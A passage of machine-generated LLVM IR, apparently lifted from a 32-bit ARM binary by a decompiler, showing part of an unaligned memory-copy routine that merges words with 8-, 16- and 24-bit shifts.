  %v0_c7d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c7d4 = load i32, i32* @ip, align 4
  %v2_c7d4 = sub i32 %v0_c7d4, %v1_c7d4
  store i32 %v2_c7d4, i32* %r2.global-to-local, align 4
  %v4_c7d4 = xor i32 %v1_c7d4, %v0_c7d4
  %v5_c7d4 = xor i32 %v2_c7d4, %v0_c7d4
  %v6_c7d4 = and i32 %v5_c7d4, %v4_c7d4
  %v7_c7d4 = icmp slt i32 %v6_c7d4, 0
  store i1 %v7_c7d4, i1* %cpsr_v.global-to-local, align 1
  %v8_c7d4 = icmp slt i32 %v2_c7d4, 0
  store i1 %v8_c7d4, i1* %cpsr_n.global-to-local, align 1
  %v5_c7d8 = icmp slt i32 %v0_c7d4, %v1_c7d4
  br i1 %v5_c7d8, label %bb132, label %dec_label_pc_c7dc

dec_label_pc_c7dc:                                ; preds = %.thread11
  %v0_c7dc = load i32, i32* @r1, align 4
  %v1_c7dc = urem i32 %v0_c7dc, 4
  store i32 %v1_c7dc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_c7dc = icmp eq i32 %v1_c7dc, 0
  %extract.t123 = trunc i32 %v0_c7dc to i2
  br i1 %v2_c7dc, label %dec_label_pc_c718, label %dec_label_pc_c7e4

dec_label_pc_c7e4:                                ; preds = %dec_label_pc_c710, %dec_label_pc_c7dc
  %v0_c82c74 = phi i32 [ %v1_c6f0, %dec_label_pc_c710 ], [ %v0_c82c75, %dec_label_pc_c7dc ]
  %v0_c8d8 = phi i32 [ %v2_c700, %dec_label_pc_c710 ], [ %v2_c7d4, %dec_label_pc_c7dc ]
  %v0_c7ec.off0 = phi i2 [ %extract.t, %dec_label_pc_c710 ], [ %extract.t123, %dec_label_pc_c7dc ]
  %v0_c7e4 = phi i32 [ %v0_c6f0, %dec_label_pc_c710 ], [ %v0_c7dc, %dec_label_pc_c7dc ]
  %v1_c7e4 = and i32 %v0_c7e4, -4
  store i32 %v1_c7e4, i32* %r1.global-to-local, align 4
  %v1_c7e8 = inttoptr i32 %v1_c7e4 to i32*
  %v2_c7e8 = load i32, i32* %v1_c7e8, align 4
  store i32 %v2_c7e8, i32* @lr, align 4
  %v4_c7e8 = add i32 %v1_c7e4, 4
  store i32 %v4_c7e8, i32* %r1.global-to-local, align 4
  %v2_c8d0 = add i32 %v0_c8d8, -12
  %v4_c8d0 = sub i32 11, %v0_c8d8
  %v5_c8d0 = and i32 %v4_c8d0, %v0_c8d8
  %v6_c8d0 = icmp slt i32 %v5_c8d0, 0
  store i1 %v6_c8d0, i1* %cpsr_v.global-to-local, align 1
  %v7_c8d0 = icmp slt i32 %v2_c8d0, 0
  store i1 %v7_c8d0, i1* %cpsr_n.global-to-local, align 1
  %v5_c8d4 = icmp slt i32 %v0_c8d8, 12
  switch i2 %v0_c7ec.off0, label %dec_label_pc_c7f8 [
    i2 -1, label %dec_label_pc_c8d0
    i2 -2, label %dec_label_pc_c864
  ]

dec_label_pc_c7f8:                                ; preds = %dec_label_pc_c7e4
  br i1 %v5_c8d4, label %dec_label_pc_c844, label %dec_label_pc_c800

dec_label_pc_c800:                                ; preds = %dec_label_pc_c7f8
  store i32 %v2_c8d0, i32* %r2.global-to-local, align 4
  %v3_c804 = load i32, i32* @r4, align 4
  store i32 %v3_c804, i32* %stack_var_-16, align 4
  %v6_c804 = load i32, i32* @r5, align 4
  store i32 %v6_c804, i32* %stack_var_-12, align 4
  br label %dec_label_pc_c808

dec_label_pc_c808:                                ; preds = %dec_label_pc_c808.dec_label_pc_c808_crit_edge, %dec_label_pc_c800
  %v0_c82c = phi i32 [ %v12_c82c, %dec_label_pc_c808.dec_label_pc_c808_crit_edge ], [ %v0_c82c74, %dec_label_pc_c800 ]
  %v0_c80c = phi i32 [ %v0_c80c.pre, %dec_label_pc_c808.dec_label_pc_c808_crit_edge ], [ %v4_c7e8, %dec_label_pc_c800 ]
  %v0_c808 = phi i32 [ %v0_c808.pre, %dec_label_pc_c808.dec_label_pc_c808_crit_edge ], [ %v2_c7e8, %dec_label_pc_c800 ]
  %v3_c808 = udiv i32 %v0_c808, 256
  store i32 %v3_c808, i32* %r3.global-to-local, align 4
  %v1_c80c = inttoptr i32 %v0_c80c to i32*
  %v2_c80c = load i32, i32* %v1_c80c, align 4
  store i32 %v2_c80c, i32* %r4.global-to-local, align 4
  %v3_c80c = add i32 %v0_c80c, 4
  %v4_c80c = inttoptr i32 %v3_c80c to i32*
  %v5_c80c = load i32, i32* %v4_c80c, align 4
  store i32 %v5_c80c, i32* %r5.global-to-local, align 4
  %v6_c80c = add i32 %v0_c80c, 8
  %v7_c80c = inttoptr i32 %v6_c80c to i32*
  %v8_c80c = load i32, i32* %v7_c80c, align 4
  store i32 %v8_c80c, i32* %ip.global-to-local, align 4
  %v9_c80c = add i32 %v0_c80c, 12
  %v10_c80c = inttoptr i32 %v9_c80c to i32*
  %v11_c80c = load i32, i32* %v10_c80c, align 4
  store i32 %v11_c80c, i32* @lr, align 4
  %v12_c80c = add i32 %v0_c80c, 16
  store i32 %v12_c80c, i32* %r1.global-to-local, align 4
  %v4_c810 = mul i32 %v2_c80c, 16777216
  %v5_c810 = or i32 %v4_c810, %v3_c808
  store i32 %v5_c810, i32* %r3.global-to-local, align 4
  %v3_c814 = udiv i32 %v2_c80c, 256
  %v4_c818 = mul i32 %v5_c80c, 16777216
  %v5_c818 = or i32 %v4_c818, %v3_c814
  store i32 %v5_c818, i32* %r4.global-to-local, align 4
  %v3_c81c = udiv i32 %v5_c80c, 256
  %v4_c820 = mul i32 %v8_c80c, 16777216
  %v5_c820 = or i32 %v4_c820, %v3_c81c
  store i32 %v5_c820, i32* %r5.global-to-local, align 4
  %v3_c824 = udiv i32 %v8_c80c, 256
  %v4_c828 = mul i32 %v11_c80c, 16777216
  %v5_c828 = or i32 %v4_c828, %v3_c824
  store i32 %v5_c828, i32* @ip, align 4
  %v1_c82c = inttoptr i32 %v0_c82c to i32*
  store i32 %v5_c810, i32* %v1_c82c, align 4
  %v3_c82c = add i32 %v0_c82c, 4
  %v4_c82c = inttoptr i32 %v3_c82c to i32*
  %v5_c82c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_c82c, i32* %v4_c82c, align 4
  %v6_c82c = add i32 %v0_c82c, 8
  %v7_c82c = inttoptr i32 %v6_c82c to i32*
  %v8_c82c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_c82c, i32* %v7_c82c, align 4
  %v9_c82c = add i32 %v0_c82c, 12
  %v10_c82c = inttoptr i32 %v9_c82c to i32*
  %v11_c82c = load i32, i32* @ip, align 4
  store i32 %v11_c82c, i32* %v10_c82c, align 4
  %v12_c82c = add i32 %v0_c82c, 16
  store i32 %v12_c82c, i32* %r0.global-to-local, align 4
  %v0_c830 = load i32, i32* %r2.global-to-local, align 4
  %v2_c830 = add i32 %v0_c830, -16
  store i32 %v2_c830, i32* %r2.global-to-local, align 4
  %v6_c834 = icmp slt i32 %v0_c830, 16
  br i1 %v6_c834, label %dec_label_pc_c838, label %dec_label_pc_c808.dec_label_pc_c808_crit_edge

dec_label_pc_c808.dec_label_pc_c808_crit_edge:    ; preds = %dec_label_pc_c808
  %v0_c808.pre = load i32, i32* @lr, align 4
  %v0_c80c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c808

dec_label_pc_c838:                                ; preds = %dec_label_pc_c808
  %v2_c838 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_c838, i32* @r4, align 4
  %v5_c838 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_c838, i32* @r5, align 4
  %v2_c83c = add i32 %v0_c830, -4
  store i32 %v2_c83c, i32* %r2.global-to-local, align 4
  %v4_c83c = add i32 %v0_c830, 2147483632
  %v5_c83c = and i32 %v2_c83c, %v4_c83c
  %v6_c83c = icmp slt i32 %v5_c83c, 0
  store i1 %v6_c83c, i1* %cpsr_v.global-to-local, align 1
  %v7_c83c = icmp slt i32 %v2_c83c, 0
  store i1 %v7_c83c, i1* %cpsr_n.global-to-local, align 1
  %v5_c840 = icmp slt i32 %v2_c830, -12
  br i1 %v5_c840, label %dec_label_pc_c85c, label %dec_label_pc_c844

dec_label_pc_c844:                                ; preds = %dec_label_pc_c838, %dec_label_pc_c7f8, %dec_label_pc_c844
  %v1_c850 = phi i32 [ %v4_c850, %dec_label_pc_c844 ], [ %v12_c82c, %dec_label_pc_c838 ], [ %v0_c82c74, %dec_label_pc_c7f8 ]
  %v0_c844 = load i32, i32* @lr, align 4
  %v3_c844 = udiv i32 %v0_c844, 256
  store i32 %v3_c844, i32* %ip.global-to-local, align 4
  %v0_c848 = load i32, i32* %r1.global-to-local, align 4
  %v1_c848 = inttoptr i32 %v0_c848 to i32*
  %v2_c848 = load i32, i32* %v1_c848, align 4
  store i32 %v2_c848, i32* @lr, align 4
  %v4_c848 = add i32 %v0_c848, 4
  store i32 %v4_c848, i32* %r1.global-to-local, align 4
  %v4_c84c = mul i32 %v2_c848, 16777216
  %v5_c84c = or i32 %v4_c84c, %v3_c844
  store i32 %v5_c84c, i32* @ip, align 4
  %v2_c850 = inttoptr i32 %v1_c850 to i32*
  store i32 %v5_c84c, i32* %v2_c850, align 4
  %v3_c850 = load i32, i32* %r0.global-to-local, align 4
  %v4_c850 = add i32 %v3_c850, 4
  store i32 %v4_c850, i32* %r0.global-to-local, align 4
  %v0_c854 = load i32, i32* %r2.global-to-local, align 4
  %v2_c854 = add i32 %v0_c854, -4
  store i32 %v2_c854, i32* %r2.global-to-local, align 4
  %v6_c858 = icmp slt i32 %v0_c854, 4
  br i1 %v6_c858, label %dec_label_pc_c85c.loopexit, label %dec_label_pc_c844

dec_label_pc_c85c.loopexit:                       ; preds = %dec_label_pc_c844
  %v4_c854 = sub i32 3, %v0_c854
  %v5_c854 = and i32 %v4_c854, %v0_c854
  %v6_c854 = icmp slt i32 %v5_c854, 0
  %v7_c854 = icmp slt i32 %v2_c854, 0
  store i1 %v6_c854, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_c854, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_c85c

dec_label_pc_c85c:                                ; preds = %dec_label_pc_c85c.loopexit, %dec_label_pc_c838
  %v2_c79c111 = phi i32 [ %v4_c850, %dec_label_pc_c85c.loopexit ], [ %v12_c82c, %dec_label_pc_c838 ]
  %v0_c78c107 = phi i32 [ %v2_c854, %dec_label_pc_c85c.loopexit ], [ %v2_c83c, %dec_label_pc_c838 ]
  %v0_c85c = load i32, i32* %r1.global-to-local, align 4
  %v1_c85c = add i32 %v0_c85c, -3
  store i32 %v1_c85c, i32* @r1, align 4
  br label %bb132

dec_label_pc_c864:                                ; preds = %dec_label_pc_c7e4
  br i1 %v5_c8d4, label %dec_label_pc_c8b0, label %dec_label_pc_c86c

dec_label_pc_c86c:                                ; preds = %dec_label_pc_c864
  store i32 %v2_c8d0, i32* %r2.global-to-local, align 4
  %v3_c870 = load i32, i32* @r4, align 4
  store i32 %v3_c870, i32* %stack_var_-16, align 4
  %v6_c870 = load i32, i32* @r5, align 4
  store i32 %v6_c870, i32* %stack_var_-12, align 4
  br label %dec_label_pc_c874

dec_label_pc_c874:                                ; preds = %dec_label_pc_c874.dec_label_pc_c874_crit_edge, %dec_label_pc_c86c
  %v0_c898 = phi i32 [ %v12_c898, %dec_label_pc_c874.dec_label_pc_c874_crit_edge ], [ %v0_c82c74, %dec_label_pc_c86c ]
  %v0_c878 = phi i32 [ %v0_c878.pre, %dec_label_pc_c874.dec_label_pc_c874_crit_edge ], [ %v4_c7e8, %dec_label_pc_c86c ]
  %v0_c874 = phi i32 [ %v0_c874.pre, %dec_label_pc_c874.dec_label_pc_c874_crit_edge ], [ %v2_c7e8, %dec_label_pc_c86c ]
  %v3_c874 = udiv i32 %v0_c874, 65536
  store i32 %v3_c874, i32* %r3.global-to-local, align 4
  %v1_c878 = inttoptr i32 %v0_c878 to i32*
  %v2_c878 = load i32, i32* %v1_c878, align 4
  store i32 %v2_c878, i32* %r4.global-to-local, align 4
  %v3_c878 = add i32 %v0_c878, 4
  %v4_c878 = inttoptr i32 %v3_c878 to i32*
  %v5_c878 = load i32, i32* %v4_c878, align 4
  store i32 %v5_c878, i32* %r5.global-to-local, align 4
  %v6_c878 = add i32 %v0_c878, 8
  %v7_c878 = inttoptr i32 %v6_c878 to i32*
  %v8_c878 = load i32, i32* %v7_c878, align 4
  store i32 %v8_c878, i32* %ip.global-to-local, align 4
  %v9_c878 = add i32 %v0_c878, 12
  %v10_c878 = inttoptr i32 %v9_c878 to i32*
  %v11_c878 = load i32, i32* %v10_c878, align 4
  store i32 %v11_c878, i32* @lr, align 4
  %v12_c878 = add i32 %v0_c878, 16
  store i32 %v12_c878, i32* %r1.global-to-local, align 4
  %v4_c87c = mul i32 %v2_c878, 65536
  %v5_c87c = or i32 %v4_c87c, %v3_c874
  store i32 %v5_c87c, i32* %r3.global-to-local, align 4
  %v3_c880 = udiv i32 %v2_c878, 65536
  %v4_c884 = mul i32 %v5_c878, 65536
  %v5_c884 = or i32 %v4_c884, %v3_c880
  store i32 %v5_c884, i32* %r4.global-to-local, align 4
  %v3_c888 = udiv i32 %v5_c878, 65536
  %v4_c88c = mul i32 %v8_c878, 65536
  %v5_c88c = or i32 %v4_c88c, %v3_c888
  store i32 %v5_c88c, i32* %r5.global-to-local, align 4
  %v3_c890 = udiv i32 %v8_c878, 65536
  %v4_c894 = mul i32 %v11_c878, 65536
  %v5_c894 = or i32 %v4_c894, %v3_c890
  store i32 %v5_c894, i32* @ip, align 4
  %v1_c898 = inttoptr i32 %v0_c898 to i32*
  store i32 %v5_c87c, i32* %v1_c898, align 4
  %v3_c898 = add i32 %v0_c898, 4
  %v4_c898 = inttoptr i32 %v3_c898 to i32*
  %v5_c898 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_c898, i32* %v4_c898, align 4
  %v6_c898 = add i32 %v0_c898, 8
  %v7_c898 = inttoptr i32 %v6_c898 to i32*
  %v8_c898 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_c898, i32* %v7_c898, align 4
  %v9_c898 = add i32 %v0_c898, 12
  %v10_c898 = inttoptr i32 %v9_c898 to i32*
  %v11_c898 = load i32, i32* @ip, align 4
  store i32 %v11_c898, i32* %v10_c898, align 4
  %v12_c898 = add i32 %v0_c898, 16
  store i32 %v12_c898, i32* %r0.global-to-local, align 4
  %v0_c89c = load i32, i32* %r2.global-to-local, align 4
  %v2_c89c = add i32 %v0_c89c, -16
  store i32 %v2_c89c, i32* %r2.global-to-local, align 4
  %v6_c8a0 = icmp slt i32 %v0_c89c, 16
  br i1 %v6_c8a0, label %dec_label_pc_c8a4, label %dec_label_pc_c874.dec_label_pc_c874_crit_edge

dec_label_pc_c874.dec_label_pc_c874_crit_edge:    ; preds = %dec_label_pc_c874
  %v0_c874.pre = load i32, i32* @lr, align 4
  %v0_c878.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c874

dec_label_pc_c8a4:                                ; preds = %dec_label_pc_c874
  %v2_c8a4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_c8a4, i32* @r4, align 4
  %v5_c8a4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_c8a4, i32* @r5, align 4
  %v2_c8a8 = add i32 %v0_c89c, -4
  store i32 %v2_c8a8, i32* %r2.global-to-local, align 4
  %v4_c8a8 = add i32 %v0_c89c, 2147483632
  %v5_c8a8 = and i32 %v2_c8a8, %v4_c8a8
  %v6_c8a8 = icmp slt i32 %v5_c8a8, 0
  store i1 %v6_c8a8, i1* %cpsr_v.global-to-local, align 1
  %v7_c8a8 = icmp slt i32 %v2_c8a8, 0
  store i1 %v7_c8a8, i1* %cpsr_n.global-to-local, align 1
  %v5_c8ac = icmp slt i32 %v2_c89c, -12
  br i1 %v5_c8ac, label %dec_label_pc_c8c8, label %dec_label_pc_c8b0

dec_label_pc_c8b0:                                ; preds = %dec_label_pc_c8a4, %dec_label_pc_c864, %dec_label_pc_c8b0
  %v1_c8bc = phi i32 [ %v4_c8bc, %dec_label_pc_c8b0 ], [ %v12_c898, %dec_label_pc_c8a4 ], [ %v0_c82c74, %dec_label_pc_c864 ]
  %v0_c8b0 = load i32, i32* @lr, align 4
  %v3_c8b0 = udiv i32 %v0_c8b0, 65536
  store i32 %v3_c8b0, i32* %ip.global-to-local, align 4
  %v0_c8b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_c8b4 = inttoptr i32 %v0_c8b4 to i32*
  %v2_c8b4 = load i32, i32* %v1_c8b4, align 4
  store i32 %v2_c8b4, i32* @lr, align 4
  %v4_c8b4 = add i32 %v0_c8b4, 4
  store i32 %v4_c8b4, i32* %r1.global-to-local, align 4
  %v4_c8b8 = mul i32 %v2_c8b4, 65536
  %v5_c8b8 = or i32 %v4_c8b8, %v3_c8b0
  store i32 %v5_c8b8, i32* @ip, align 4
  %v2_c8bc = inttoptr i32 %v1_c8bc to i32*
  store i32 %v5_c8b8, i32* %v2_c8bc, align 4
  %v3_c8bc = load i32, i32* %r0.global-to-local, align 4
  %v4_c8bc = add i32 %v3_c8bc, 4
  store i32 %v4_c8bc, i32* %r0.global-to-local, align 4
  %v0_c8c0 = load i32, i32* %r2.global-to-local, align 4
  %v2_c8c0 = add i32 %v0_c8c0, -4
  store i32 %v2_c8c0, i32* %r2.global-to-local, align 4
  %v6_c8c4 = icmp slt i32 %v0_c8c0, 4
  br i1 %v6_c8c4, label %dec_label_pc_c8c8.loopexit, label %dec_label_pc_c8b0

dec_label_pc_c8c8.loopexit:                       ; preds = %dec_label_pc_c8b0
  %v4_c8c0 = sub i32 3, %v0_c8c0
  %v5_c8c0 = and i32 %v4_c8c0, %v0_c8c0
  %v6_c8c0 = icmp slt i32 %v5_c8c0, 0
  %v7_c8c0 = icmp slt i32 %v2_c8c0, 0
  store i1 %v6_c8c0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_c8c0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_c8c8

dec_label_pc_c8c8:                                ; preds = %dec_label_pc_c8c8.loopexit, %dec_label_pc_c8a4
  %v2_c79c112 = phi i32 [ %v4_c8bc, %dec_label_pc_c8c8.loopexit ], [ %v12_c898, %dec_label_pc_c8a4 ]
  %v0_c78c108 = phi i32 [ %v2_c8c0, %dec_label_pc_c8c8.loopexit ], [ %v2_c8a8, %dec_label_pc_c8a4 ]
  %v0_c8c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c8c8 = add i32 %v0_c8c8, -2
  store i32 %v1_c8c8, i32* @r1, align 4
  br label %bb132

dec_label_pc_c8d0:                                ; preds = %dec_label_pc_c7e4
  br i1 %v5_c8d4, label %dec_label_pc_c91c, label %dec_label_pc_c8d8

dec_label_pc_c8d8:                                ; preds = %dec_label_pc_c8d0
  store i32 %v2_c8d0, i32* %r2.global-to-local, align 4
  %v3_c8dc = load i32, i32* @r4, align 4
  store i32 %v3_c8dc, i32* %stack_var_-16, align 4
  %v6_c8dc = load i32, i32* @r5, align 4
  store i32 %v6_c8dc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_c8e0

dec_label_pc_c8e0:                                ; preds = %dec_label_pc_c8e0.dec_label_pc_c8e0_crit_edge, %dec_label_pc_c8d8
  %v0_c904 = phi i32 [ %v12_c904, %dec_label_pc_c8e0.dec_label_pc_c8e0_crit_edge ], [ %v0_c82c74, %dec_label_pc_c8d8 ]
  %v0_c8e4 = phi i32 [ %v0_c8e4.pre, %dec_label_pc_c8e0.dec_label_pc_c8e0_crit_edge ], [ %v4_c7e8, %dec_label_pc_c8d8 ]
  %v0_c8e0 = phi i32 [ %v0_c8e0.pre, %dec_label_pc_c8e0.dec_label_pc_c8e0_crit_edge ], [ %v2_c7e8, %dec_label_pc_c8d8 ]
  %v3_c8e0 = udiv i32 %v0_c8e0, 16777216
  store i32 %v3_c8e0, i32* %r3.global-to-local, align 4
  %v1_c8e4 = inttoptr i32 %v0_c8e4 to i32*
  %v2_c8e4 = load i32, i32* %v1_c8e4, align 4
  store i32 %v2_c8e4, i32* %r4.global-to-local, align 4
  %v3_c8e4 = add i32 %v0_c8e4, 4
  %v4_c8e4 = inttoptr i32 %v3_c8e4 to i32*
  %v5_c8e4 = load i32, i32* %v4_c8e4, align 4
  store i32 %v5_c8e4, i32* %r5.global-to-local, align 4
  %v6_c8e4 = add i32 %v0_c8e4, 8
  %v7_c8e4 = inttoptr i32 %v6_c8e4 to i32*
  %v8_c8e4 = load i32, i32* %v7_c8e4, align 4
  store i32 %v8_c8e4, i32* %ip.global-to-local, align 4
  %v9_c8e4 = add i32 %v0_c8e4, 12
  %v10_c8e4 = inttoptr i32 %v9_c8e4 to i32*
  %v11_c8e4 = load i32, i32* %v10_c8e4, align 4
  store i32 %v11_c8e4, i32* @lr, align 4
  %v12_c8e4 = add i32 %v0_c8e4, 16
  store i32 %v12_c8e4, i32* %r1.global-to-local, align 4
  %v4_c8e8 = mul i32 %v2_c8e4, 256
  %v5_c8e8 = or i32 %v4_c8e8, %v3_c8e0
  store i32 %v5_c8e8, i32* %r3.global-to-local, align 4
  %v3_c8ec = udiv i32 %v2_c8e4, 16777216
  %v4_c8f0 = mul i32 %v5_c8e4, 256
  %v5_c8f0 = or i32 %v4_c8f0, %v3_c8ec
  store i32 %v5_c8f0, i32* %r4.global-to-local, align 4
  %v3_c8f4 = udiv i32 %v5_c8e4, 16777216
  %v4_c8f8 = mul i32 %v8_c8e4, 256
  %v5_c8f8 = or i32 %v4_c8f8, %v3_c8f4
  store i32 %v5_c8f8, i32* %r5.global-to-local, align 4
  %v3_c8fc = udiv i32 %v8_c8e4, 16777216
  %v4_c900 = mul i32 %v11_c8e4, 256
  %v5_c900 = or i32 %v4_c900, %v3_c8fc
  store i32 %v5_c900, i32* @ip, align 4
  %v1_c904 = inttoptr i32 %v0_c904 to i32*
  store i32 %v5_c8e8, i32* %v1_c904, align 4
  %v3_c904 = add i32 %v0_c904, 4
  %v4_c904 = inttoptr i32 %v3_c904 to i32*
  %v5_c904 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_c904, i32* %v4_c904, align 4
  %v6_c904 = add i32 %v0_c904, 8
  %v7_c904 = inttoptr i32 %v6_c904 to i32*
  %v8_c904 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_c904, i32* %v7_c904, align 4
  %v9_c904 = add i32 %v0_c904, 12
  %v10_c904 = inttoptr i32 %v9_c904 to i32*
  %v11_c904 = load i32, i32* @ip, align 4
  store i32 %v11_c904, i32* %v10_c904, align 4
  %v12_c904 = add i32 %v0_c904, 16
  store i32 %v12_c904, i32* %r0.global-to-local, align 4
  %v0_c908 = load i32, i32* %r2.global-to-local, align 4
  %v2_c908 = add i32 %v0_c908, -16
  store i32 %v2_c908, i32* %r2.global-to-local, align 4
  %v6_c90c = icmp slt i32 %v0_c908, 16
  br i1 %v6_c90c, label %dec_label_pc_c910, label %dec_label_pc_c8e0.dec_label_pc_c8e0_crit_edge

dec_label_pc_c8e0.dec_label_pc_c8e0_crit_edge:    ; preds = %dec_label_pc_c8e0
  %v0_c8e0.pre = load i32, i32* @lr, align 4
  %v0_c8e4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c8e0

dec_label_pc_c910:                                ; preds = %dec_label_pc_c8e0
  %v2_c910 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_c910, i32* @r4, align 4
  %v5_c910 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_c910, i32* @r5, align 4
  %v2_c914 = add i32 %v0_c908, -4
  store i32 %v2_c914, i32* %r2.global-to-local, align 4
  %v4_c914 = add i32 %v0_c908, 2147483632
  %v5_c914 = and i32 %v2_c914, %v4_c914
  %v6_c914 = icmp slt i32 %v5_c914, 0
  store i1 %v6_c914, i1* %cpsr_v.global-to-local, align 1
  %v7_c914 = icmp slt i32 %v2_c914, 0
  store i1 %v7_c914, i1* %cpsr_n.global-to-local, align 1
  %v5_c918 = icmp slt i32 %v2_c908, -12
  br i1 %v5_c918, label %dec_label_pc_c934, label %dec_label_pc_c91c

dec_label_pc_c91c:                                ; preds = %dec_label_pc_c910, %dec_label_pc_c8d0, %dec_label_pc_c91c
  %v1_c928 = phi i32 [ %v4_c928, %dec_label_pc_c91c ], [ %v12_c904, %dec_label_pc_c910 ], [ %v0_c82c74, %dec_label_pc_c8d0 ]
  %v0_c91c = load i32, i32* @lr, align 4
  %v3_c91c = udiv i32 %v0_c91c, 16777216
  store i32 %v3_c91c, i32* %ip.global-to-local, align 4
  %v0_c920 = load i32, i32* %r1.global-to-local, align 4
  %v1_c920 = inttoptr i32 %v0_c920 to i32*
  %v2_c920 = load i32, i32* %v1_c920, align 4
  store i32 %v2_c920, i32* @lr, align 4
  %v4_c920 = add i32 %v0_c920, 4
  store i32 %v4_c920, i32* %r1.global-to-local, align 4
  %v4_c924 = mul i32 %v2_c920, 256
  %v5_c924 = or i32 %v4_c924, %v3_c91c
  store i32 %v5_c924, i32* @ip, align 4
  %v2_c928 = inttoptr i32 %v1_c928 to i32*
  store i32 %v5_c924, i32* %v2_c928, align 4
  %v3_c928 = load i32, i32* %r0.global-to-local, align 4
  %v4_c928 = add i32 %v3_c928, 4
  store i32 %v4_c928, i32* %r0.global-to-local, align 4
  %v0_c92c = load i32, i32* %r2.global-to-local, align 4
  %v2_c92c = add i32 %v0_c92c, -4
  store i32 %v2_c92c, i32* %r2.global-to-local, align 4
  %v6_c930 = icmp slt i32 %v0_c92c, 4
  br i1 %v6_c930, label %dec_label_pc_c934.loopexit, label %dec_label_pc_c91c

dec_label_pc_c934.loopexit:                       ; preds = %dec_label_pc_c91c
  %v4_c92c = sub i32 3, %v0_c92c
  %v5_c92c = and i32 %v4_c92c, %v0_c92c
  %v6_c92c = icmp slt i32 %v5_c92c, 0
  %v7_c92c = icmp slt i32 %v2_c92c, 0
  store i1 %v6_c92c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_c92c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_c934

dec_label_pc_c934:                                ; preds = %dec_label_pc_c934.loopexit, %dec_label_pc_c910
  %v2_c79c113 = phi i32 [ %v4_c928, %dec_label_pc_c934.loopexit ], [ %v12_c904, %dec_label_pc_c910 ]
  %v0_c78c109 = phi i32 [ %v2_c92c, %dec_label_pc_c934.loopexit ], [ %v2_c914, %dec_label_pc_c910 ]
  %v0_c934 = load i32, i32* %r1.global-to-local, align 4
  %v1_c934 = add i32 %v0_c934, -1
  store i32 %v1_c934, i32* @r1, align 4
  br label %bb132

dec_label_pc_c93c:                                ; preds = %entry
  %v1_c93c = load i32, i32* @r2, align 4
  %v2_c93c = add i32 %v1_c93c, %v0_c6f0
  store i32 %v2_c93c, i32* @r1, align 4
  %v2_c940 = add i32 %v1_c93c, %v1_c6f0
  store i32 %v2_c940, i32* %r0.global-to-local, align 4
  %v2_c944 = add i32 %v1_c93c, -4
  store i32 %v2_c944, i32* %r2.global-to-local, align 4
  %v4_c944 = sub i32 3, %v1_c93c
  %v5_c944 = and i32 %v4_c944, %v1_c93c
  %v6_c944 = icmp slt i32 %v5_c944, 0
  store i1 %v6_c944, i1* %cpsr_v.global-to-local, align 1
  %v7_c944 = icmp slt i32 %v2_c944, 0
  store i1 %v7_c944, i1* %cpsr_n.global-to-local, align 1
  %v5_c948 = icmp slt i32 %v1_c93c, 4
  br i1 %v5_c948, label %bb142, label %dec_label_pc_c94c

dec_label_pc_c94c:                                ; preds = %dec_label_pc_c93c
  %v1_c94c = urem i32 %v2_c940, 4
  store i32 %v1_c94c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_c94c = icmp eq i32 %v1_c94c, 0
  br i1 %v2_c94c, label %dec_label_pc_c954, label %dec_label_pc_c9f4

dec_label_pc_c954:                                ; preds = %dec_label_pc_c94c
  %v1_c954 = urem i32 %v2_c93c, 4
  store i32 %v1_c954, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_c954 = icmp eq i32 %v1_c954, 0
  br i1 %v2_c954, label %dec_label_pc_c95c, label %dec_label_pc_ca20

dec_label_pc_c95c:                                ; preds = %dec_label_pc_c954, %dec_label_pc_ca18
  %v0_c97448 = phi i32 [ %v2_c940, %dec_label_pc_c954 ], [ %v0_ca6831, %dec_label_pc_ca18 ]
  %v0_c97047 = phi i32 [ %v2_c93c, %dec_label_pc_c954 ], [ %v0_ca18, %dec_label_pc_ca18 ]
  %v0_c95c = phi i32 [ %v2_c944, %dec_label_pc_c954 ], [ %v2_ca10, %dec_label_pc_ca18 ]
  %v2_c95c = add i32 %v0_c95c, -8
  store i32 %v2_c95c, i32* %r2.global-to-local, align 4
  %v4_c95c = sub i32 7, %v0_c95c
  %v5_c95c = and i32 %v4_c95c, %v0_c95c
  %v6_c95c = icmp slt i32 %v5_c95c, 0
  store i1 %v6_c95c, i1* %cpsr_v.global-to-local, align 1
  %v7_c95c = icmp slt i32 %v2_c95c, 0
  store i1 %v7_c95c, i1* %cpsr_n.global-to-local, align 1
  %v5_c960 = icmp slt i32 %v0_c95c, 8
  br i1 %v5_c960, label %dec_label_pc_c9ac, label %dec_label_pc_c964

dec_label_pc_c964:                                ; preds = %dec_label_pc_c95c
  %v3_c964 = load i32, i32* @r4, align 4
  %v5_c964 = inttoptr i32 %v3_c964 to i8*
  store i8* %v5_c964, i8** %stack_var_-8, align 4
  %v8_c964 = load i32, i32* @lr, align 4
  %v2_c968 = add i32 %v0_c95c, -28
  store i32 %v2_c968, i32* %r2.global-to-local, align 4
  %v4_c968 = sub i32 27, %v0_c95c
